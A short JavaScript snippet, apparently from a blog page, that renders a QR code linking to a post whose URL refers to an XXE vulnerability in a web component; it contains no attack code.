var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-H5SiteControl-xmlhttp-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 